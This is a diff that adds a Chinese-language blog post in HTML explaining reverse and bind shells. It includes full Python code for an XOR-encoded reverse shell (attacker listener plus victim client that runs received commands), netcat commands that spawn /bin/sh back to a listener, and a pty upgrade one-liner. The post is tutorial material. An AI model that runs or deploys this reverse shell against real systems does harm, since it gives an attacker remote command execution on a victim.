@@ -1,0 +1,337 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>反向Shell和伪终端 | Reticence</title>
+<link rel="shortcut icon" href="http://127.0.0.1:8080/favicon.ico?v=1619508275369">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="http://127.0.0.1:8080/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="反向Shell和伪终端 | Reticence - Atom Feed" href="http://127.0.0.1:8080/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?197e96d6e079d4c80f9674c92eb62002";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-90HNEFFE0M"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-90HNEFFE0M');
+</script>
+
+
+    <meta name="description" content="参考链接：https://resources.infosecinstitute.com/topic/icmp-reverse-shell/#:~:text=A%20reverse%20shell%20is%20a,Bind%20shell
+..." />
+    <meta name="keywords" content="Linux,Others" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="http://127.0.0.1:8080">
+  <img class="avatar" src="http://127.0.0.1:8080/images/avatar.png?v=1619508275369" alt="">
+  </a>
+  <h1 class="site-title">
+    Reticence
+  </h1>
+  <p class="site-description">
+    <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?197e96d6e079d4c80f9674c92eb62002";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          Index
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          Classification
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          Archives
+        </a>
+      
+    
+      
+        <a href="/navigator.html" class="menu">
+          Navigator
+        </a>
+      
+    
+      
+        <a href="/post/book-list" class="menu">
+          Booklist
+        </a>
+      
+    
+      
+        <a href="/post/fei-md-ge-shi-bi-ji-hui-zong" class="menu">
+          Notes
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          About
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/reticenceji" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+        <a href="https://www.zhihu.com/people/reticenceji" target="_blank">
+          <i class="ri-zhihu-line"></i>
+        </a>
+      
+    
+      
+    
+  </div>
+  <script>
+  var _hmt = _hmt || [];
+  (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?197e96d6e079d4c80f9674c92eb62002";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+  })();
+  </script>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              反向Shell和伪终端
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-11-20
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+                <a href="http://127.0.0.1:8080/tag/i1ce0_J8S/" class="post-tag">
+                  # Linux
+                </a>
+              
+                <a href="http://127.0.0.1:8080/tag/F7-18Ec_H/" class="post-tag">
+                  # Others
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>参考链接：https://resources.infosecinstitute.com/topic/icmp-reverse-shell/#:~:text=A%20reverse%20shell%20is%20a,Bind%20shell</p>
+<p>Shell can simply be described as a piece of code or program which can be used to gain code or command execution on a device .<br>
+Shell可以简单的认为是一个可以执行用户命令的程序。</p>
+<h2 id="reverse-shell-and-bind-shell">Reverse shell and Bind shell</h2>
+<p>他们都是通过TCP连接的远程shell。<br>
+<img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110414_1037_ICMPReverse1.png" alt="" loading="lazy"></p>
+<center> Figure 1: Reverse TCP shell </center>
+<figure data-type="image" tabindex="1"><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110414_1037_ICMPReverse2.png" alt="" loading="lazy"></figure>
+<center> Figure 2: Bind TCP shell </center>
+<p>Bind TCP shell，比如我们ssh的远程连接。<br>
+Reverse TCP shell，我们直接来看一个demo。</p>
+<h2 id="反向shell-demo">反向shell demo</h2>
+<p>这是在攻击者上运行的脚本，一个简陋的shell环境。</p>
+<pre><code># 在attack上运行，作为一个服务器发送数据
+import socket 
+
+# 创建一个套接字。第一个参数表示使用IPV4，第二个参数表示创建一个TCP socket
+# https://docs.python.org/3/library/socket.html#socket.AF_INET
+# https://docs.python.org/3/library/socket.html#socket.SOCK_STREAM
+# 用with真香，不用close了
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+	# 将套接字绑定到 address。套接字必须尚未绑定。0.0.0.0是一个缺省的表述。
+	# port应该在1-65535，并且小于1024的需要权限
+	s.bind((&quot;0.0.0.0&quot;, 4431))
+	# 开启监听，1是连接的最大数量
+	s.listen(1)
+	print(&quot;Listening on port 4431... &quot;)
+	# accept blocks 并等待连接
+	# accept返回值为一个connection，以及client的地址。我们通过这个connection和client通信。
+	conn, client_addr = s.accept()
+	with conn:
+		print (&quot; Received connection from : &quot;, client_addr)
+		while True:
+			command = input('~$ ')
+			encode = bytearray(command,encoding=&quot;utf-8&quot;)
+			for i in range(len(encode)):
+				encode[i] ^=0x41
+			conn.sendall(encode)
+
+			en_data=conn.recv(1024)
+			decode = bytearray(en_data)
+			for i in range(len(decode)):
+				decode[i] ^=0x41
+			print(decode.decode(&quot;utf-8&quot;))
+</code></pre>
+<p>这是受害者上运行的脚本。</p>
+<pre><code>#在victim上运行,作为客户接受数据
+import socket,subprocess,sys
+
+RHOST = sys.argv[1]
+RPORT = 4431
+with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
+	s.connect((RHOST,RPORT))
+	while True:
+		# 从socket中接收XOR编码的数据
+		data = s.recv(1024)
+		en_data = bytearray(data)
+		for i in range(len(en_data)):
+			en_data[i] ^= 0x41
+		
+		# 执行解码命令，subprocess模块能够通过PIPE STDOUT/STDERR/STDIN把值赋值给一个变量
+		proc = subprocess.Popen(en_data.decode(&quot;utf-8&quot;), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+		try:
+			# 等待子进程结束
+			proc.wait(timeout=10)
+			STDOUT, STDERR = proc.communicate()
+		except:
+			proc.kill()
+			STDOUT = b''
+			STDERR = b&quot;[ERROR] Process do not terminate&quot;
+
+		# 输出编码后的数据并且发送给指定的主机RHOST
+		en_STDOUT = bytearray(STDOUT+STDERR)
+		if not en_STDOUT:
+			en_STDOUT = bytearray(b'\n')
+
+		for i in range(len(en_STDOUT)):
+			en_STDOUT[i] ^= 0x41
+		s.sendall(en_STDOUT)
+</code></pre>
+<h2 id="伪终端">伪终端</h2>
+<p>上面的反向shell的功能并不是很强大，因为输入输出都是通过管道进行，我们不能执行像vim这样的命令，特殊控制字符（比如<code>Ctrl+C</code>）也不能发送。其实我们只是模拟了一个简易的shell。<br>
+伪终端是命令终端(cmd.exe,/bin/sh)通过网络接口反弹给攻击者，或者是新建一个监听端口反弹一个终端给攻击者。（对应于正向和反向）</p>
+<pre><code>#启动netcat监听器
+~$ nc -lvp 443
+listening on [any] 443 ...
+ 
+# 使用netcat反弹'/bin/sh'
+~$ nc 127.0.0.1 443 -e /bin/sh
+
+#然后执行命令创建伪终端
+python -c &quot;import pty;pty.spawn(&quot;/bin/bash&quot;)&quot;
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#reverse-shell-and-bind-shell">Reverse shell and Bind shell</a></li>
+<li><a href="#%E5%8F%8D%E5%90%91shell-demo">反向shell demo</a></li>
+<li><a href="#%E4%BC%AA%E7%BB%88%E7%AB%AF">伪终端</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="http://127.0.0.1:8080/post/endlesself-writeup/">
+              <h3 class="post-title">
+                EndlessELF writeup
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="http://127.0.0.1:8080/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
